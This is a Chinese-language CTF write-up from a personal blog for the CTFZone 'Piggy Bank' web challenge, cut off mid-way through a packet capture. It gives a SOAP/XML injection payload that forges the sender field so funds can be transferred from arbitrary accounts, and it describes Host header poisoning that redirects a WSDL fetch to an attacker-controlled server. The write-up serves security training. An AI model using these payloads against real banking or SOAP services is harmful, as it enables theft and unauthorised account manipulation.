<!DOCTYPE html>
<html>
    <!-- title -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="Tianji">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="Tianji">
    <meta name="keywords" content="ctfzone-ctf | Tianji">
    <meta name="description" content="">
    <meta name="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>ctfzone-ctf · Tianji&#39;s Blog</title>
    <!-- 设置密码 -->
    <script>
        (function(){
            if(''){
                if (prompt('请输入文章密码','') !== ''){
                    alert('密码错误！');
                    history.back();
                }
            }
        })();
    </script>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s 1;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href="/assets/favicon.ico">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/">Tianji&#39;s Blog.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">ctfzone-ctf</a>
            </div>
    </div>
    
    <a class="home-link" href="/">Tianji's Blog.</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="height:50vh;">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            ctfzone-ctf
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class="post-intro-tags">
    
        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count">3,688</span> / Reading time: <span class="post-count">21 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2018/08/03</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Piggy-Bank"><a href="#Piggy-Bank" class="headerlink" title="Piggy Bank"></a>Piggy Bank</h2><ol>
<li><p>根据注释找到<em><a href="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php" rel="external nofollow" target="_blank">http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php</a></em></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wsdl:definitions</span> <span class="attr">xmlns:tns</span>=<span class="string">"urn:Bank"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/soap/"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenc</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span> <span class="attr">xmlns:wsdl</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span> <span class="attr">name</span>=<span class="string">"Bank"</span> <span class="attr">targetNamespace</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">name</span>=<span class="string">"BalanceRequest"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"wallet_num"</span> <span class="attr">type</span>=<span class="string">"xsd:decimal"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">name</span>=<span class="string">"BalanceResponse"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"code"</span> <span class="attr">type</span>=<span class="string">"xsd:float"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"status"</span> <span class="attr">type</span>=<span class="string">"xsd:string"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">name</span>=<span class="string">"internalTransferRequest"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"receiver_wallet_num"</span> <span class="attr">type</span>=<span class="string">"xsd:decimal"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"sender_wallet_num"</span> <span class="attr">type</span>=<span class="string">"xsd:decimal"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"amount"</span> <span class="attr">type</span>=<span class="string">"xsd:float"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">type</span>=<span class="string">"xsd:string"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">name</span>=<span class="string">"internalTransferResponse"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"code"</span> <span class="attr">type</span>=<span class="string">"xsd:float"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">part</span> <span class="attr">name</span>=<span class="string">"status"</span> <span class="attr">type</span>=<span class="string">"xsd:string"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">portType</span> <span class="attr">name</span>=<span class="string">"BankServicePort"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">operation</span> <span class="attr">name</span>=<span class="string">"requestBalance"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">message</span>=<span class="string">"tns:BalanceRequest"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">message</span>=<span class="string">"tns:BalanceResponse"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">operation</span> <span class="attr">name</span>=<span class="string">"internalTransfer"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">message</span>=<span class="string">"tns:internalTransferRequest"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">message</span>=<span class="string">"tns:internalTransferResponse"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">portType</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">binding</span> <span class="attr">name</span>=<span class="string">"BankServiceBinding"</span> <span class="attr">type</span>=<span class="string">"tns:BankServicePort"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:binding</span> <span class="attr">style</span>=<span class="string">"rpc"</span> <span class="attr">transport</span>=<span class="string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">operation</span> <span class="attr">name</span>=<span class="string">"requestBalance"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:operation</span> <span class="attr">soapAction</span>=<span class="string">"urn:requestBalanceAction"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">"encoded"</span> <span class="attr">namespace</span>=<span class="string">"urn:Bank"</span> <span class="attr">encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">"encoded"</span> <span class="attr">namespace</span>=<span class="string">"urn:Bank"</span> <span class="attr">encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">operation</span> <span class="attr">name</span>=<span class="string">"internalTransfer"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:operation</span> <span class="attr">soapAction</span>=<span class="string">"urn:internalTransferAction"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">"encoded"</span> <span class="attr">namespace</span>=<span class="string">"urn:Bank"</span> <span class="attr">encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">"encoded"</span> <span class="attr">namespace</span>=<span class="string">"urn:Bank"</span> <span class="attr">encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">binding</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wsdl:service</span> <span class="attr">name</span>=<span class="string">"BankService"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wsdl:port</span> <span class="attr">name</span>=<span class="string">"BankServicePort"</span> <span class="attr">binding</span>=<span class="string">"tns:BankServiceBinding"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:port</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:definitions</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>包含两个API</p>
<ul>
<li><strong>Request Balance</strong> allows us to see the balance of any account id we want.</li>
<li><strong>Internal Transfer</strong> transfers some amount from account <em>sender</em> to account <em>receiver</em>.</li>
</ul>
</li>
<li><p>解法1：XML/soap注入</p>
<p>internalTransfer请求：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span> [DATA FROM FORM INPUT] <span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span> [LOGGED IN USER ID] <span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span> [DATA FROM FORM INPUT] <span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span> [SECRET SERVER TOKEN] <span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>传递参数Receiver:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Our ID) &lt;/receiver_wallet_num&gt;</span><br><span class="line">&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;(Any ID)&lt;/sender_wallet_num&gt;&lt;!--</span><br></pre></td></tr></table></figure>
<p>传递参数Amount:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;&lt;amount xsi:type=&quot;xsd:float&quot;&gt; (Amount)</span><br></pre></td></tr></table></figure>
<p>结果:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span> (Our ID) <span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>(Any ID)<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;/receiver_wallet_num&gt;</span></span><br><span class="line"><span class="comment">&lt;sender_wallet_num xsi:type="xsd:decimal"&gt; [LOGGED IN USER ID] &lt;/sender_wallet_num&gt;</span></span><br><span class="line"><span class="comment">&lt;amount xsi:type="xsd:float"&gt; </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span> (Amount) <span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span> [SECRET SERVER TOKEN] <span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后开burp跑就行。</p>
<p><img src="/assets/ctfzone/TIM截图20180803174532.png" alt=""></p>
</li>
<li><p>解法2：Host header poisoning</p>
<p>从上图，我们可以看到当前Host是<code>web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one</code></p>
<p>修改该Host为我们的vps_ip,并在我们的vps上创建<code>/api/bankservice.wsdl.php</code>文件，然后发包，监听80端口。</p>
<p><img src="/assets/ctfzone/TIM截图20180803181237.png" alt=""></p>
<p>监听端口:</p>
<blockquote>
<p>ngrep -q -d eth0 -W byline port 80</p>
</blockquote>
<p>抓包结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">T 10.135.89.224:80 -&gt; 18.184.147.62:46038 [A]</span><br><span class="line">HTTP/1.1 200 OK.</span><br><span class="line">Date: Fri, 03 Aug 2018 10:08:43 GMT.</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16.</span><br><span class="line">X-Powered-By: PHP/5.4.16.</span><br><span class="line">Content-Length: 2907.</span><br><span class="line">Connection: close.</span><br><span class="line">Content-Type: text/html; charset=UTF-8.</span><br><span class="line">.</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definitions name=&quot;Bank&quot;</span><br><span class="line">             targetNamespace=&quot;urn:Bank&quot;</span><br><span class="line">             xmlns:tns=&quot;urn:Bank&quot;</span><br><span class="line">             xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;</span><br><span class="line">             xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;</span><br><span class="line">             xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span><br><span class="line">             xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot;</span><br><span class="line">             xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;message name=&quot;BalanceRequest&quot;&gt;</span><br><span class="line">        &lt;part name=&quot;wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class="line">    &lt;/message&gt;</span><br><span class="line"></span><br><span class="line">    &lt;message name=&quot;BalanceResponse&quot;&gt;</span><br><span class="line">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class="line">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class="line">    &lt;/message&gt;</span><br><span class="line"></span><br><span class="line">    &lt;message name=&quot;internalTransferRequest&quot;&gt;</span><br><span class="line">        &lt;part name=&quot;receiver_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class="line">        &lt;part name=&quot;sender_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class="line">        &lt;part name=&quot;amount&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class="line">        &lt;part name=&quot;token&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class="line">    &lt;/message&gt;</span><br><span class="line"></span><br><span class="line">    &lt;message 